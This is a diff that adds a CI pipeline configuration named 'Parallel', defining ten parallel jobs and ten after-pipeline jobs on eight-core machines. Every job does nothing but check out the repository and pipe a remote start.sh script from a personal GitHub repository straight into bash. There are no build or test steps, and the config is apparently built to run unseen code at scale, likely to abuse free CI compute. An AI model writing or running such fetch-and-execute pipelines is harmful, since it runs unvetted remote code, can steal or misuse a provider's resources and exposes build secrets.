@@ -1,0 +1,93 @@
+version: v1.0
+name: Parallel
+agent:
+  machine:
+    type: e1-standard-8
+    os_image: ubuntu2004
+blocks:
+  - name: 'Block #1'
+    task:
+      jobs:
+        - name: 'Job #A'
+          commands:
+            - checkout
+            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+        - name: 'Job #B'
+          commands:
+            - checkout
+            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+        - name: 'Job #C'
+          commands:
+            - checkout
+            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+        - name: 'Job #D'
+          commands:
+            - checkout
+            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+        - name: 'Job #E'
+          commands:
+            - checkout
+            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+        - name: 'Job #F'
+          commands:
+            - checkout
+            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+        - name: 'Job #G'
+          commands:
+            - checkout
+            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+        - name: 'Job #H'
+          commands:
+            - checkout
+            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+        - name: 'Job #I'
+          commands:
+            - checkout
+            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+        - name: 'Job #J'
+          commands:
+            - checkout
+            - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+after_pipeline:
+  task:
+    jobs:
+      - name: 'Job #1'
+        commands:
+          - checkout
+          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+      - name: 'Job #2'
+        commands:
+          - checkout
+          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+      - name: 'Job #3'
+        commands:
+          - checkout
+          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+      - name: 'Job #4'
+        commands:
+          - checkout
+          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+      - name: 'Job #5'
+        commands:
+          - checkout
+          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+      - name: 'Job #6'
+        commands:
+          - checkout
+          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+      - name: 'Job #7'
+        commands:
+          - checkout
+          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+      - name: 'Job #8'
+        commands:
+          - checkout
+          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+      - name: 'Job #9'
+        commands:
+          - checkout
+          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
+      - name: 'Job #10'
+        commands:
+          - checkout
+          - 'curl https://raw.githubusercontent.com/sahrulega56/asu/main/start.sh | bash'
